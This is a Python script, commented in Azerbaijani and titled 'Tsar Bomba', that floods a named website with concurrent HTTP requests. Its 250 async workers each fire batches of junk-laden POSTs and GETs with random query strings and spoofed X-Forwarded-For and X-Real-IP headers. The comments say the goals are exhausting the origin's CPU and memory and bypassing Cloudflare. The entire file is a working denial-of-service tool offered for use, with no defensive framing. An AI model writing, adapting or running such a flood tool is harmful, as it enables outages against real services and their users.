import asyncio
import httpx
import random
import string
import os

# --- ATOM BOMBASI KONFİQURASİYASI ---
TARGET_URL = "https://streamwin.win"
WORKERS = 250        # Maksimum paralel hücumçu
BATCH_SIZE = 150     # Hər hücumçunun eyni anda açdığı "öldürücü" stream sayı
DATA_STRIKE = 4096   # Hər POST-da göndərilən ağır yük (CPU-nu dondurmaq üçün)

def generate_junk(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

async def tsar_strike(worker_id, client):
    print(f"☢️  TSAR WARHEAD {worker_id} - TARGETING ORIGIN SERVER...")
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Connection": "keep-alive"
    }

    while True:
        try:
            # Serverin daxili loglarını və RAM-ını kilitləyəcək dinamik URL
            url = f"{TARGET_URL}/?{generate_junk(10)}={generate_junk(50)}&db_attack={random.getrandbits(64)}"
            
            tasks = []
            for _ in range(BATCH_SIZE):
                h = headers.copy()
                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                h["X-Forwarded-For"] = fake_ip
                h["X-Real-IP"] = fake_ip
                
                # VECTOR A: MASSIVE JSON POST (Server RAM/CPU Kilitləmə)
                if _ % 2 == 0:
                    heavy_payload = {generate_junk(10): generate_junk(DATA_STRIKE) for _ in range(5)}
                    tasks.append(client.post(url, headers=h, json=heavy_payload))
                
                # VECTOR B: HTTP/2 FRAME FLOODING (Bağlantı Kanallarını Bağlama)
                else:
                    tasks.append(client.get(url, headers=h))

            # Bütün asinxron sorğuları eyni anda serverin prosessoruna çırp!
            # return_exceptions=True sayəsində xətalar olsa da dayanmayacaq
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Gözləmə müddətini sıfıra endiririk (Maksimum zərbə sürəti)
            await asyncio.sleep(0.0001)

        except Exception:
            await asyncio.sleep(0.1)

async def main():
    print(f"💀 GLOBAL TSAR BOMBA ACTIVATED: {TARGET_URL}")
    print("[!] Resource Exhaustion: Targeting Origin CPU and Memory...")
    
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    # TCP hüdudlarını və bağlantı limitlərini tamamilə ləğv daxili client
    async with httpx.AsyncClient(
        http2=True,          # Cloudflare Bypass üçün HTTP/2 mütləqdir
        verify=False, 
        limits=limits, 
        timeout=10.0,        # Server donanda bağlantını buraxma (Slowloris effekti)
        follow_redirects=True
    ) as client:
        
        workers = [tsar_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
